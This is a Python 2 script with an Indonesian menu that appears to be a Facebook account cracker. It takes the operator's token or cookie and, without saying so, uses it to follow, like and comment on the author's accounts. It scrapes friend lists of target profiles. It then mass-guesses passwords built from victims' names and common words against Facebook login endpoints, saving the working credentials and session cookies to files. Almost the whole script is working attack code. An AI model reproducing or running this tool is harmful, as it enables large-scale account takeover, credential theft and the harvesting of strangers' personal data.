#*-coding:utf-8-*
import requests,bs4,sys,os,subprocess,time,datetime
import requests,sys,random,re,base64,json
from multiprocessing.pool import ThreadPool
reload(sys)
sys.setdefaultencoding("utf-8")

##############################
"""
Terimakasih Untuk Semuanya !!!
                           """
##############################

# Warna
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
Y = ('\x1b[1;94m')
X = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Useragent
ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mobile_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
def __login__():
	os.system('clear')
	os.system('echo -e "%s  ___\n |   \ _  _ _ __  _ __\n | |) | || | ‘  \| ‘_.\ \n%s |___/ \_,_|_|_|_| .__/\n                 |_|\n"'%(P,H))
	print("%s«%s!%s Anda diwajibkan menggunakan akun yang tidak terpakai/akun baru."%(K,M,P))
	print("\n%s1%s»%s Login pakai token"%(H,B,P))
	print("%s2%s»%s Login pakai cookie"%(H,B,P))
	print("%s3%s»%s Cara dapat token or cookie"%(H,B,P))
	print("%s4%s»%s Keluar"%(M,K,P))
	__login=raw_input("\n%s«%s?%s Choose :%s "%(B,H,P,X))
	if __login in['']:
		exit("%s«%s!%s Wrong input"%(K,M,K))
	elif __login in ['1','01']:
		try:
			__token__=raw_input("%s«%s?%s Token :%s "%(B,H,P,X))
			if __token__ in ['',' ']:
				exit("%s«%s!%s Jangan kosong"%(K,M,K))
			cekz=requests.get('https://graph.facebook.com/me/?access_token=%s'%(__token__))
			kz=json.loads(cekz.text);nama=kz['name']
			save__=open('_____tokenz_____', 'w');save__.write(__token__);save__.close()
			__follow__()
		except KeyError:
			exit("%s«%s!%s Token Salah"%(K,M,K))
	elif __login in ['2','02']:
		try:
			__cookie__=raw_input("%s«%s?%s Cookie :%s "%(B,H,P,X))
			if __cookie__ in ['',' ']:
				exit("%s«%s!%s Jangan kosong"%(K,M,K))
			data=requests.get('https://business.facebook.com/business_locations', headers = {
				'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
				'referer'                   : 'https://www.facebook.com/',
				'host'                      : 'business.facebook.com',
				'origin'                    : 'https://business.facebook.com',
				'upgrade-insecure-requests' : '1',
				'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'cache-control'             : 'max-age=0',
				'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
				'content-type'              : 'text/html; charset=utf-8'
			}, cookies = {
				'cookie'                    : __cookie__
			})
			find_token = re.search('(EAAG\w+)', data.text)
			if find_token is None:
				exit("%s«%s!%s Cookie Salah"%(K,M,K))
			save__=open('_____cookie_____', 'w');save__.write(__cookie__);save__.close()
			save__=open('_____tokenz_____', 'w');save__.write(find_token.group(1));save__.close()
			__follow__()
		except:
			exit("%s«%s!%s Sepertinya ada yang salah"%(K,M,K))
	elif __login in ['3','03']:
		print("%s«%s!%s Anda akan diarahkan ke browser"%(K,M,P));time.sleep(2)
		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg");exit()
	elif __login in ['4','04']:
		exit()
	else:
		exit("%s«%s!%s Wrong input"%(K,M,K))
# Kalo Mau Di Ganti Izin Dulu :v
def __follow__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except IOError:
		print("%s«%s!%s Token invalid"%(K,M,K));time.sleep(2)
		__login__()
	try:
		web = datetime.datetime.now()
		__waktu = web.strftime("%H:%M:%S/%d-%m-%Y")
		__hour = web.hour
		if 06 <= __hour < 11:
			__ucapkan = ('Selamat Pagi 💙')
		elif 11 <= __hour < 15:
			__ucapkan = ('Selamat Siang 💛')
		elif 15 <= __hour < 18:
			__ucapkan = ('Selamat Sore 🧡')
		else:
			__ucapkan = ('Selamat Malam 🖤')
		__kata=random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
		__komen__= (__ucapkan+'\n\n'+__kata+'\n'+__waktu)
		__komen2__= (__ucapkan+'\n\n'+__kata+'\n'+__waktu)
		100041129048948
		requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(__token__)) #rozhak
		requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(__token__)) #rozhak2
		requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(__token__)) #muhammad rozhak
		requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(__token__)) #foto sampul
		requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(__token__)) # foto profil
		requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(__ucapkan,__token__)) #foto sampul
		requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(__komen__,__token__)) #foto profil
		requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(__komen2__,__token__)) #foto profil
		requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(__token__)) #iwan
	except:
		exit("%s«%s!%s Sepertinya ada yang error"%(K,M,K))
	print("%s«%s!%s Login berhasil"%(B,H,P))
	__menu__()
def __menu__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except IOError:
		print("%s«%s!%s Token invalid"%(K,M,K));time.sleep(2)
		__login__()
	try:
		getz=requests.get('https://graph.facebook.com/me/?access_token=%s'%(__token__))
		gz=json.loads(getz.text)
		nama=gz['name']
	except KeyError:
		print("%s«%s!%s Token invalid"%(K,M,K));time.sleep(2)
		os.remove("_____tokenz_____");__login__()
	os.system('clear')
	os.system('echo -e "%s  ___\n |   \ _  _ _ __  _ __\n | |) | || | ‘  \| ‘_.\ \n%s |___/ \_,_|_|_|_| .__/\n                 |_|\n"'%(P,H))
	print("%s«%s！%sWelcome :%s %s"%(K,X,P,B,nama))

	print("\n%s1%s»%s Dump id publik old (2015-2004)"%(H,B,P))
	print("%s2%s»%s Dump id publik new (2020-2021)"%(H,B,P))
	print("%s3%s»%s Dump id publik acak (2021-2004)"%(H,B,P))
	print("%s4%s»%s Dump id publik masal new (2020-2021)"%(H,B,P))
	print("%s5%s»%s Dump id publik masal acak (2021-2004)"%(H,B,P))
	print("%s6%s»%s Mulai crack"%(K,B,H))
	print("%s7%s»%s Lihat hasil crack"%(H,B,P))
	print("%s8%s»%s Hapus tokenz"%(M,B,K))
	__menu=raw_input("\n%s«%s?%s Choose :%s "%(B,H,P,X))
	if __menu in ['']:
		exit("%s«%s!%s Wrong input"%(K,M,K))
	elif __menu in ['1','01']:
		__old__()
	elif __menu in ['2','02']:
		__new__()
	elif __menu in ['3','03']:
		__acak__()
	elif __menu in ['4','04']:
		__masal__()
	elif __menu in ['5','05']:
		__masal2__()
	elif __menu in ['6','06']:
		__metode__()
	elif __menu in ['7','07']:
		print("\n%s1%s»%s Lihat hasil Ok"%(H,B,P))
		print("%s2%s»%s Lihat hasil Cp"%(H,B,P))
		print("%s3%s»%s Kembali"%(K,B,P))
		__hasilz=raw_input("\n%s«%s?%s Choose :%s "%(B,H,P,X))
		if __hasilz in ['1','01']:
			try:
				__ok__=open('Ok.txt', 'r').read()
			except:
				exit("%s«%s!%s Hasil 'ok' tidak ada"%(K,M,K))
			print("\n%s%s"%(P,__ok__))
		elif __hasilz in ['2','02']:
			try:
				__cp__=open('Cp.txt', 'r').read()
			except:
				exit("%s«%s!%s Hasil 'cp' tidak ada"%(K,M,K))
			print("\n%s%s"%(P,__cp__))
		else:
			exit("%s«%s!%s Wrong input"%(K,M,K))
	elif __menu in ['8','08']:
		os.remove("_____tokenz_____")
		exit()
	else:
		exit("%s«%s!%s Wrong input"%(K,M,K))
def __old__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except I0Error:
		exit("%s«%s!%s Token invalid"%(K,M,K))
	try:
		__ids=raw_input("\n%s«%s?%s User :%s "%(H,K,P,H))
		ups=requests.get("https://graph.facebook.com/%s?access_token=%s"%(__ids,__token__))
		ps=json.loads(ups.text);qw=ps['first_name'].lower()
		print("%s«%s?%s Nama :%s %s"%(H,K,P,H,ps['name']))
	except KeyError:
		exit("%s«%s!%s User tidak ditemukan"%(K,M,K))
	try:
		rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
		ex=json.loads(rex.text)
		sv=(qw+'.txt').replace(" ","_");file = open(sv , 'a')
		id = []
		for a in ex['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			file.write(a['id']+"<=>"+a['name']+'\n')
			print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
			if a['id'][:6] in ['100009']:
				file.close()
				print("\r%s                   "%(P))
				print("%s«%s?%s Total id :%s %s"%(H,K,P,H,len(id)))
				print("%s«%s?%s File tersimpan di :%s %s"%(H,K,P,H,sv))
				raw_input("%s«%sKembali%s»"%(H,P,H));__menu__()
	except KeyError:
		exit("%s«%s!%s Dump gagal, mungkin target tidak memiliki teman"%(K,M,K))
def __new__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except I0Error:
		exit("%s«%s!%s Token invalid"%(K,M,K))
	try:
		__ids=raw_input("\n%s«%s?%s User :%s "%(H,K,P,H))
		ups=requests.get("https://graph.facebook.com/%s?access_token=%s"%(__ids,__token__))
		ps=json.loads(ups.text);qw=ps['first_name'].lower()
		print("%s«%s?%s Nama :%s %s"%(H,K,P,H,ps['name']))
	except KeyError:
		exit("%s«%s!%s User tidak ditemukan"%(K,M,K))
	try:
		rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
		ex=json.loads(rex.text)
		sv=(qw+'.txt').replace(" ","_");file = open(sv , 'a')
		id = []
		for a in ex['friends']['data']:
			if a['id'][:5] in ['10005','10006','10007','10008']:
				id.append(a['id']+"<=>"+a['name'])
				file.write(a['id']+"<=>"+a['name']+'\n')
				print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
		file.close()
		print("\r%s                   "%(P))
		print("%s«%s?%s Total id :%s %s"%(H,K,P,H,len(id)))
		print("%s«%s?%s File tersimpan di :%s %s"%(H,K,P,H,sv))
		raw_input("%s«%sKembali%s»"%(H,P,H));__menu__()
	except KeyError:
		exit("%s«%s!%s Dump gagal, mungkin target tidak memiliki teman"%(K,M,K))
def __acak__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except I0Error:
		exit("%s«%s!%s Token invalid"%(K,M,K))
	try:
		__ids=raw_input("\n%s«%s?%s User :%s "%(H,K,P,H))
		ups=requests.get("https://graph.facebook.com/%s?access_token=%s"%(__ids,__token__))
		ps=json.loads(ups.text);qw=ps['first_name'].lower()
		print("%s«%s?%s Nama :%s %s"%(H,K,P,H,ps['name']))
	except KeyError:
		exit("%s«%s!%s User tidak ditemukan"%(K,M,K))
	try:
		rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
		ex=json.loads(rex.text)
		sv=(qw+'.txt').replace(" ","_");file = open(sv , 'a')
		id = []
		for a in ex['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			file.write(a['id']+"<=>"+a['name']+'\n')
			print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
		file.close()
		print("\r%s                   "%(P))
		print("%s«%s?%s Total id :%s %s"%(H,K,P,H,len(id)))
		print("%s«%s?%s File tersimpan di :%s %s"%(H,K,P,H,sv))
		raw_input("%s«%sKembali%s»"%(H,P,H));__menu__()
	except KeyError:
		exit("%s«%s!%s Dump gagal, mungkin target tidak memiliki teman"%(K,M,K))
def __masal__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except I0Error:
		exit("%s«%s!%s Token invalid"%(K,M,K))
	try:
		__total = int(raw_input("\n%s«%s?%s Dump berapa id :%s "%(H,K,P,H)))
	except:
		__total = 1
	__file = raw_input("%s«%s?%s Nama file :%s "%(H,K,P,H))
	for zx in range(__total):
		zx += 1
		__ids=raw_input("%s%s%s»%s User :%s "%(H,K,P,zx,H))
		try:
			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
			ex=json.loads(rex.text)
			file = open(__file , 'a')
			id = []
			for a in ex['friends']['data']:
				if a['id'][:5] in ['10005','10006','10007','10008']:
					id.append(a['id']+"<=>"+a['name'])
					file.write(a['id']+"<=>"+a['name']+'\n')
					print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
		except KeyError:
			exit("%s«%s!%s Dump gagal, mungkin user salah / tidak memiliki teman"%(K,M,K))
	file.close()
	print("\r%s                   "%(P))
	__id=open(__file, 'r').readlines()
	print("%s«%s?%s Total id :%s %s"%(H,K,P,H,len(__id)))
	print("%s«%s?%s File tersimpan di :%s %s"%(H,K,P,H,__file))
	raw_input("%s«%sKembali%s»"%(H,P,H));__menu__()
def __masal2__():
	try:
		__token__=open('_____tokenz_____', 'r').read()
	except I0Error:
		exit("%s«%s!%s Token invalid"%(K,M,K))
	try:
		__total = int(raw_input("\n%s«%s?%s Dump berapa id :%s "%(H,K,P,H)))
	except:
		__total = 1
	__file = raw_input("%s«%s?%s Nama file :%s "%(H,K,P,H))
	for zx in range(__total):
		zx += 1
		__ids=raw_input("%s%s%s»%s User :%s "%(H,K,P,zx,H))
		try:
			rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,__token__))
			ex=json.loads(rex.text)
			file = open(__file , 'a')
			id = []
			for a in ex['friends']['data']:
				id.append(a['id']+"<=>"+a['name'])
				file.write(a['id']+"<=>"+a['name']+'\n')
				print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
		except KeyError:
			exit("%s«%s!%s Dump gagal, mungkin user salah / tidak memiliki teman"%(K,M,K))
	file.close()
	print("\r%s                   "%(P))
	__id=open(__file, 'r').readlines()
	print("%s«%s?%s Total id :%s %s"%(H,K,P,H,len(__id)))
	print("%s«%s?%s File tersimpan di :%s %s"%(H,K,P,H,__file))
	raw_input("%s«%sKembali%s»"%(H,P,H));__menu__()
def __metode__():
	print("\n%s1%s»%s Metode mbasic.facebook.com"%(H,B,P))
	print("%s2%s»%s Metode free.facebook.com"%(H,B,P))
	print("%s3%s»%s Metode mobile.facebook.com"%(H,B,P))
	__metode=raw_input("%s«%s?%s Choose :%s "%(B,H,P,X))
	if __metode in ['']:
		exit("%s«%s!%s Wrong input"%s(K,M,K))
	elif __metode in ['1','01']:
		__fast_or_slow=raw_input("\n%s«%s?%s Crack (fast/slow) :%s "%(H,K,P,H)).lower()
		if __fast_or_slow in ['']:
			exit("%s«%s!%s Jangan kosong"%(K,M,K))
		__set=open('_____setting_____' , 'w');__set.write(__fast_or_slow);__set.close()
		__crack__()
	elif __metode in ['2','02']:
		__fast_or_slow=raw_input("\n%s«%s?%s Crack (fast/slow) :%s "%(H,K,P,H)).lower()
		if __fast_or_slow in ['']:
			exit("%s«%s!%s Jangan kosong"%(K,M,K))
		__set=open('_____setting_____' , 'w');__set.write(__fast_or_slow);__set.close()
		__crack2__()
	elif __metode in ['3','03']:
		__fast_or_slow=raw_input("\n%s«%s?%s Crack (fast/slow) :%s "%(H,K,P,H)).lower()
		if __fast_or_slow in ['']:
			exit("%s«%s!%s Jangan kosong"%(K,M,K))
		__set=open('_____setting_____' , 'w');__set.write(__fast_or_slow);__set.close()
		__crack3__()
	else:
		exit("%s«%s!%s Wrong input"%(K,M,K))

def generate(text):
	try:
		__set__=open('_____setting_____', 'r').read()
	except I0Error:
		__set__=('slow')
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(text)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
			else:
				results.append(text)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"123456")
				if "slow" in __set__:
					results.append("sayang")
					results.append("anjing")
					results.append("kontol")
					results.append("123456")
					results.append("bismillah")
					results.append("rahasia")
					results.append("indonesia")
					results.append("bangsat")
	return results
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def free(em,pas,hosts):
	global ua,free_h
	r=requests.Session()
	r.headers.update(free_h)
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}
def mobile(em,pas,hosts):
	global ua,mobile_h
	r = requests.Session()
	r.headers.update(mobile_h)
	p = r.get('https://m.facebook.com/')
	b = bs4.BeautifulSoup(p.text, 'html.parser')
	dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
	data = {}
	for i in b('input'):
		if i.get('value') is None:
			if i.get('name') == 'email':
				data.update({'email': em})
			elif i.get('name') == 'pass':
				data.update({'pass': pas})
			else:
				data.update({i.get('name'): ''})
		else:
			data.update({i.get('name'): i.get('value')})
	data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
		'__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
	r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
	po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
	if 'c_user' in r.cookies.get_dict().keys():
		return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
	else:
		if 'checkpoint' in r.cookies.get_dict().keys():
			return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
		else:
			return {'status': 'error', 'email': em, 'pass': pas}

	return
class __crack__:
	def __init__(self):
		self.ok=[]
		self.cp=[]
		self.die=0
		try:
			self.file=raw_input("%s«%s?%s File dump :%s "%(H,B,P,K))
                        self.files=open(self.file).read().splitlines()
                except Exception as e:
			exit("%s«%s!%s File tidak ditemukan"%(K,M,K))
                self.fl=[]
                for i in self.files:
	                try:
				self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
	                except Exception as e:
				exit("%s«%s!%s File tidak valid"%(K,M,K))
		print("%s«%s!%s Mainkan mode pesawat jika tidak ada hasil\n"%(H,M,P))
                ThreadPool(35).map(self.main,self.fl)
               	exit("\n%s«%sSelesai%s»"%(H,P,H))
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m«Ok» "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ok.append("%s | %s"%(fl.get("id"),i))
					open("Ok.txt","a+").write("%s|%s %s\n"%(fl.get("id"), i, gets_cookies(log.get("cookies"))))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[1;93m«Cp» "+(fl.get("id")+"|"+i+"        "))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Cp.txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue

			self.die+=1
			print "\r\x1b[1;97m«Crack» %s/%s Ok:%s - Cp:%s"%(self.die,len(self.fl),len(self.ok),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class __crack2__:
	def __init__(self):
		self.ok=[]
		self.cp=[]
		self.die=0
		try:
			self.file=raw_input("%s«%s?%s File dump :%s "%(H,B,P,K))
                        self.files=open(self.file).read().splitlines()
                except Exception as e:
			exit("%s«%s!%s File tidak ditemukan"%(K,M,K))
                self.fl=[]
                for i in self.files:
	                try:
				self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
	                except Exception as e:
				exit("%s«%s!%s File tidak valid"%(K,M,K))
		print("%s«%s!%s Mainkan mode pesawat jika tidak ada hasil\n"%(H,M,P))
                ThreadPool(35).map(self.main,self.fl)
               	exit("\n%s«%sSelesai%s»"%(H,P,H))
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=free(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m«Ok» "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ok.append("%s | %s"%(fl.get("id"),i))
					open("Ok.txt","a+").write("%s|%s %s\n"%(fl.get("id"), i, gets_cookies(log.get("cookies"))))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[1;93m«Cp» "+(fl.get("id")+"|"+i+"        "))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Cp.txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue

			self.die+=1
			print "\r\x1b[1;97m«Crack» %s/%s Ok:%s - Cp:%s"%(self.die,len(self.fl),len(self.ok),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class __crack3__:
	def __init__(self):
		self.ok=[]
		self.cp=[]
		self.die=0
		try:
			self.file=raw_input("%s«%s?%s File dump :%s "%(H,B,P,K))
                        self.files=open(self.file).read().splitlines()
                except Exception as e:
			exit("%s«%s!%s File tidak ditemukan"%(K,M,K))
                self.fl=[]
                for i in self.files:
	                try:
				self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
	                except Exception as e:
				exit("%s«%s!%s File tidak valid"%(K,M,K))
		print("%s«%s!%s Mainkan mode pesawat jika tidak ada hasil\n"%(H,M,P))
                ThreadPool(35).map(self.main,self.fl)
               	exit("\n%s«%sSelesai%s»"%(H,P,H))
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mobile(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[1;92m«Ok» "+(fl.get("id")+"|"+i+" "+gets_cookies(log.get("cookies"))))
					self.ok.append("%s | %s"%(fl.get("id"),i))
					open("Ok.txt","a+").write("%s|%s %s\n"%(fl.get("id"), i, gets_cookies(log.get("cookies"))))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[1;93m«Cp» "+(fl.get("id")+"|"+i+"        "))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("Cp.txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue

			self.die+=1
			print "\r\x1b[1;97m«Crack» %s/%s Ok:%s - Cp:%s"%(self.die,len(self.fl),len(self.ok),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

if __name__=='__main__':
	os.system("git pull")
	__menu__()
